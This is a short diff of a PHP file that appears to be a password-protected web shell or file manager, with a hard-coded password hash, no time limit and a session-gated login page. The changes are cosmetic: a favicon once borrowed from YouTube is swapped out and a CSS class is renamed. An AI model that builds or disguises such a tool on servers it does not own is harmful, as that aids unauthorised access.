@@ -5,7 +5,7 @@ set_time_limit(0);
 $password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
 function login() {
 	?>
-	<link rel="icon" href="https://s.ytimg.com/yts/img/favicon_32-vflOogEID.png" sizes="32x32" >
+	<link rel="icon" href="https://cdn.onlinewebfonts.com/svg/img_552870.png" sizes="32x32">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<style type="text/css">
 		@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
@@ -575,7 +575,7 @@ if (!isset($_SESSION['login'])) {
     	margin: 13px;
     	font-size:20px;
     }
-    a.context-menu-one:hover {
+    a.menu:hover {
     	cursor: pointer;
     }
     #submit,
